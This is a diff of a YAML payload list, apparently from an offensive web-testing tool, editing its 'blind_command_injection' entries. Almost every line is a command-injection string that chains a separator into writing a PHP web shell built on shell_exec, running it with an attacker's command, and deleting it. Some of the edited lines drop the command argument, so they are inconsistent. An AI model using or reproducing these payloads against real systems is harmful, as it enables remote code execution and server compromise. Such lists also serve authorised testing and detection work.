@@ -73,11 +73,11 @@ blind_command_injection:
     webshell_05: !!str  localhost | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell.php | php 05_webshell.php ${ variables.command } | rm ./05_webshell.php
   exec:
     !!map
-    webshell_01: !!str  . ; echo '<?php echo shell_exec("${ variables.command }");?>' > 01_webshell_exec.php ; php 01_webshell_exec.php
-    webshell_02: !!str  . ; echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 02_webshell_exec.php ; php 02_webshell_exec.php ${ variables.command }
-    webshell_exec_03: !!str  .  & echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 03_webshell_exec.php & php 03_webshell_exec.php ${ variables.command }
-    webshell_exec_04: !!str  .  && echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 04_webshell_exec.php && php 04_webshell_exec.php ${ variables.command } 
-    webshell_exec_05: !!str  .  | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell_exec.php | php 05_webshell_exec.php ${ variables.command }
+    webshell_exec_01: !!str  . ; echo '<?php echo shell_exec("${ variables.command }");?>' > 01_webshell_exec.php ; php 01_webshell_exec.php ; rm ./01_webshell_exec.php
+    webshell_exec_02: !!str  . ; echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 02_webshell_exec.php ; php 02_webshell_exec.php ${ variables.command } ; rm ./02_webshell_exec.php
+    webshell_exec_03: !!str  .  & echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 03_webshell_exec.php & php 03_webshell_exec.php & rm ./03_webshell_exec.php
+    webshell_exec_04: !!str  .  && echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 04_webshell_exec.php && php 04_webshell_exec.php && rm ./04_webshell_exec.php
+    webshell_exec_05: !!str  .  | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell_exec.php | php 05_webshell_exec.php | rm ./05_webshell_exec.php
 
 xss:
   !!map
